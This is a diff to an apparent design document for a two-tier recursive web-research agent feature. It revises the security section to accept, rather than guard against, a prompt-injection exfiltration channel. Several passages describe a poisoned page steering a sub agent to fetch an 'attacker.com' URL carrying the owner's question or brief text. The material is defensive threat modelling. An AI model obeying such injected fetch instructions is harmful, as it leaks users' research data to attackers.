@@ -33,9 +33,11 @@ precisely in §5.
 
 The guiding frame, stated once: **unbounded in effort, still bounded in blast
 radius.** "No holds" relaxes the budget / depth / round holds. It does **not**
-touch the `CLAUDE.md` non-negotiables — but note §4: the two-tier recursion does
-open a *new* exfiltration channel the shipped web sandbox does not currently
-defend, and closing it is a hard build blocker, not a footnote.
+touch the `CLAUDE.md` non-negotiables. Per the owner's decision (§4), egress and
+tool access are inherited from `deep_research` (the parent⊆child clamp + the shipped
+web sandbox at every depth); the residual brief-text leak `deep_research` already
+carries is accepted, and R2's security work is bounding the *amplification* the
+second tier adds — not a new egress guard.
 
 ---
 
@@ -103,8 +105,9 @@ control and gate, not a hand-wave.
    `max_depth = 2`. A **task agent** (depth 1) may spawn **sub agents** (depth 2)
    to decompose one major sub-question; a sub agent is a hard leaf. This reopens —
    deliberately, in a bounded form — the `depth≥1` spawning `tree.py:16-19`
-   closed. It is defensible **only with the §4 controls in place** (the shipped
-   sandbox alone does not make it safe). Depth is a property of the **run**:
+   closed. Egress and tool access are `deep_research`'s (the clamp + the shipped
+   sandbox at every depth, owner decision §4); the extra tier's *amplification* is
+   bounded by the §4 controls (per-parent cap, one-shot). Depth is a property of the **run**:
    `TreeState` carries `max_depth` (default `1`); only a trusted deepest run seeds
    it at `2`, so jerv's ordinary `spawn_subagent` stays depth-1.
 
@@ -212,24 +215,38 @@ shipped-substrate path and is sufficient for R6.
 
 ---
 
-## §4. Security — the two-tier recursion opens a new exfil channel; here is the real argument
+## §4. Security — the trust model is deep_research's; the new work is bounding amplification
 
 `tree.py:16-19` closed `depth≥1` spawning for **two** reasons: the model
 "wouldn't use it reliably" (a *value* concern, folded into the R2 gate) and the
-"**brief-laundering** surface." Reopening it is a real security decision. The
-draft's original claim — *"a laundered brief can only cause more sandboxed web
-research, not exfiltration"* — **does not survive the red-team, and is retracted.**
+"**brief-laundering** surface." Reopening it is a real security decision, and the
+red-team's core correction stands: the draft's claim *"a laundered brief can only
+cause more sandboxed web research, not exfiltration"* was **wrong and is retracted**
+— an exfil channel for brief text does exist (below). What the **owner decided**
+(2026-07-22) is how to treat it: **deepest inherits `deep_research`'s exact trust
+model** — sub agents share jerv's allowances through the parent⊆child clamp, and the
+shipped web sandbox (SSRF private-host block, `no_memory`, empty domain + read scope,
+no location, no KB) applies at *every* depth. **No bespoke egress control** (no
+allowlist, no URL-substring guard, no forced topic-label rewrite). The residual is
+accepted as `deep_research` already accepts it; R2's security work is bounding the
+*amplification* the extra tier adds, not inventing a new guard.
 
-**The exfiltration channel (retracts "nothing to exfiltrate").** The SSRF guard
-blocks only private/loopback/reserved hosts (`web/fetch.py:275-289`); a routable
-**public** host passes. The sandbox is **not** empty of sensitive data — the
-design threads the **owner's question** (and, up-tree, fed summaries) verbatim
-into every brief. So a live channel exists: attacker page read at depth 1/2 →
-injected brief → sub agent `web_fetch`es `attacker.com/leak?q=<owner question +
-fed context>`. `fetch.py`'s own safety rationale (lines 8-9) *explicitly* rests on
-"no owner data in context" — a precondition this design breaks. It is both an
-exfiltration channel (in-context brief text leaves via the URL) and an integrity
-channel (the attacker steers what gets searched and narrated back).
+**The residual, stated honestly (accepted, not eliminated).** The SSRF guard blocks
+only private/loopback/reserved hosts (`web/fetch.py:275-289`); a routable **public**
+host passes. A research child's brief already contains question-derived text, so a
+poisoned page it reads could inject "fetch `attacker.com/?q=<brief text>`" — leaking
+what is being researched. **This channel already exists in `deep_research` today**;
+the two-tier fan *amplifies* it (more agents, more reads), it does not invent it.
+Two things bound the harm and make the residual acceptable:
+- **The firewalled domains never enter the sandbox at any depth** — health, finance,
+  and location data are absent by construction (`no_memory`, empty `domain_scopes`,
+  no location). Only *research-brief text* can leak; the sensitive tiers cannot.
+- **Amplification is capped** — the per-run token/wall-clock ceiling and the caps in
+  the controls below bound how much attacker-steered research a single run can do.
+
+The owner accepts leakage of research-brief text as the price of an open-web research
+tool, exactly as for `deep_research`. That is a deliberate risk acceptance on record,
+not an oversight.
 
 **What actually holds — the tool-clamp half.** `sub ⊆ task_effective ⊆
 orchestrator` is real and monotone: a child loop's `ctx.agent_tools` is the
@@ -241,19 +258,17 @@ orchestrator's or the sub-persona's raw set. Fan-count amplification is also har
 bounded — `can_admit` is a global counter (`tree.py:144`), so recursion cannot
 explode agent count.
 
-**The controls — required, and mostly NOT in code today.** Two of the four
-controls the draft claimed are vapor: there is no per-parent sub-fan cap
-(`run_research_fan` has only the tree-wide total, `spawn.py:572`) and no
-decomposition tool (the only depth-≥1 affordances are `spawn_subagent`, hard-gated
-at depth 0, and internal `run_research_fan`, ungated). Enabling depth-1 spawning
-also **deletes the belt-and-suspenders leaf guarantee** (personas hold no spawn
-tool, `spawn.py:18-19`) — depth becomes the *sole* guard. So the controls are R2
-**build blockers**, not open decisions:
+**The controls — amplification bounds, not a new egress guard.** Per the owner's
+decision, egress and tool access are `deep_research`'s (the clamp + the shipped
+sandbox); the R2 controls exist to bound the *amplification* the second tier adds and
+to keep the spawn decision structured. Enabling depth-1 spawning **deletes the
+belt-and-suspenders leaf guarantee** (personas hold no spawn tool, `spawn.py:18-19`),
+so depth becomes the sole structural guard — these controls put the guard rails back.
+They are R2 **build blockers**:
 
-1. **Egress-exfil control** (the new one) — one of: an egress **allowlist**
-   (search-engine + fetched-link hosts only); a guard that **no brief/question
-   text may appear in an outbound URL** (path/query); or **never embed the raw
-   owner question** in a sub-agent brief — pass a sanitized topic label only.
+1. **Egress / tool access = `deep_research`'s model (owner decision).** Sub agents
+   share jerv's allowances via the parent⊆child clamp; the shipped web sandbox applies
+   at every depth. No new allowlist or URL guard. The residual (above) is accepted.
 2. **Decomposition-only spawn** — the task-agent persona reaches spawning *only*
    through a structured decomposition tool that **refuses free-form/raw spawn
    args**. No raw spawn affordance at depth 1.
@@ -275,18 +290,18 @@ tool, `spawn.py:18-19`) — depth becomes the *sole* guard. So the controls are 
    hard-bounded by `tree_budget`; the *synthesis reserve* needs a tree-wide
    concurrency semaphore + a recursion-aware reserve redesign.
 
-**The R2 security gate (100% coverage, `CLAUDE.md` rule 3)** must include, and the
-draft's single "isolation test" is insufficient:
-- an **egress-exfil test** that instruments the *outbound URLs a depth-2 agent
-  attempts* — because with a faked web transport (how these tests run)
-  `guard_public_host` is skipped (`fetch.py:207,263-264`), so the SSRF guard proves
-  nothing; the test must assert on URLs directly.
+**The R2 security gate (100% coverage, `CLAUDE.md` rule 3)** — since egress is
+`deep_research`'s (no new guard to test), the gate proves the clamp + firewalls hold
+at the new depth and the amplification bounds bite:
 - a **transitivity test** — orchestrator lacks tool X, both task and sub personas
-  list X → assert the sub agent does **not** get X.
+  list X → assert the sub agent does **not** get X (the clamp composes across tiers).
 - a **negative-depth test** — an ordinary (non-deepest) turn's `TreeState` has
   `max_depth==1` and a depth-1 child is refused spawning even with the depth-2 code
-  compiled in.
-- the memory / domain-scope / location / one-shot-decomposition isolation asserts.
+  compiled in (run-scoped depth, no global escalation).
+- **firewall/sandbox isolation at depth 2** — a depth-2 sub agent has empty
+  memory / domain-scope / read-scope and no location, exactly like a depth-1 child.
+- **amplification-bound tests** — the per-parent sub-fan cap `K` and the one-shot
+  decomposition flag each refuse the (K+1)th / second spawn from one task agent.
 
 **Residual, quantified and accepted (settled decision 4).** With a resized tree
 cap of ~N agents × `CHILD_MAX_COST_TOKENS` (900k), the worst case is *tens of
@@ -340,8 +355,10 @@ an injection heuristic is **out of scope** (not detectable today) but named here
   re-run round double-counts → the run refuses its own fans).
 - **`research_run_state` checkpoint table** (RLS `external`, + isolation test),
   round-boundary writes, rehydrate-and-continue.
-- **The adaptive stability judge** (§3.3), the egress-exfil control + the R2 gate
-  tests (§4), the decomposition tool + per-parent cap, the progress channel (§3.5).
+- **The adaptive stability judge** (§3.3) [shipped in R1], the R2 gate tests (§4),
+  the decomposition tool + per-parent cap + one-shot flag, the progress channel (§3.5).
+  (Egress/tool access is inherited from `deep_research` per the owner decision — no
+  new egress control to build.)
 - **The trusted seed path** and its negative-depth guard (§4 control 5).
 
 ---
@@ -352,7 +369,7 @@ an injection heuristic is **out of scope** (not detectable today) but named here
 |---|---|---|
 | **R0** | **Raise-the-constants probe** (no new code beyond constants + a bench harness). Raise `deep_research`'s `MAX_RESEARCH_ROUNDS`, gap-k, breadth to a ceiling; run a fixed benchmark of ≥8 genuinely-large questions; blind-rate vs today's default. | **The §0 kill gate.** Only a demonstrated coverage gap (bounded-at-ceiling still under-covers *for lack of rounds*, not tuning/search/synthesis) authorizes R1. |
 | **R1** | **Adaptive loop spike** — the resource-bounded reflect→refill loop + the **new** diminishing-returns judge (a co-located `.prompt` + schema field, versioned per DEVELOPMENT.md), *in-request, depth-1 only*, as `deep_research(mode=deepest)`. | **Value, not just correctness.** On the R0 benchmark, blind-rate default vs bounded-at-ceiling vs adaptive on a **pre-registered** rubric. **KILL R2–R8 if:** the adaptive run is not preferred over bounded-at-ceiling on a clear majority; or its marginal gain per +1M tokens is below a pre-registered threshold; or the gaps trace to something other than round-depth. Loop also terminates on all three conditions in tests. |
-| **R2** | **Two-tier recursion + its security controls** — run-scoped `max_depth` on `TreeState`; the decomposition-only spawn tool (refuses free-form); per-parent cap `K`; one-shot-decomposition flag; the egress-exfil control (§4). | **Security gate at 100%:** egress-exfil (URL-instrumented), transitivity, negative-depth, memory/domain/location/one-shot isolation tests (§4). **Plus a value check:** depth-1 decomposition reliably beats a flat fan of equal agent count. |
+| **R2** | **Two-tier recursion + amplification controls** — run-scoped `max_depth` on `TreeState`; the decomposition-only spawn tool (refuses free-form); per-parent cap `K`; one-shot-decomposition flag. Egress/tool access inherited from `deep_research` (owner decision, §4) — no new egress guard. | **Security gate at 100%:** transitivity (clamp composes across tiers), negative-depth (run-scoped), depth-2 firewall/sandbox isolation, and the K / one-shot amplification-bound tests (§4). **Plus a value check:** depth-1 decomposition reliably beats a flat fan of equal agent count. |
 | **R3** | **Concurrent execution lane** — reuse `TaskRunner`/`LoopTurnExecutor` headless context + pass `tree=`; a detached concurrent task with its own watchdog + cancellation. | A deepest run does **not** block a concurrent scheduled task or a second deepest run (proves *concurrent*, not merely *elsewhere*). Watchdog cancels a runaway. |
 | **R4** | **Trusted run-context + seed isolation** — the seed path for `max_depth=2`; all lane DB access on an **RLS-scoped session** via the storage abstraction. | Isolation test: the lane session cannot read another domain's rows and cannot mint a tree with any scope the interactive path lacks; a non-deepest seed cannot produce `max_depth>1`. |
 | **R5** | **Checkpoint / resume** — `research_run_state` (RLS `external` + isolation test), round-boundary commit, `TreeState` absolute-deadline + counter-rewind, mirroring `media_analysis_results`/0138. | Kill-mid-run → resume **continues from the last committed round and produces a coverage-equivalent report** over the accumulated findings (assert findings/source superset + a completed report — **not** byte-equality; LLM calls are non-seeded). |
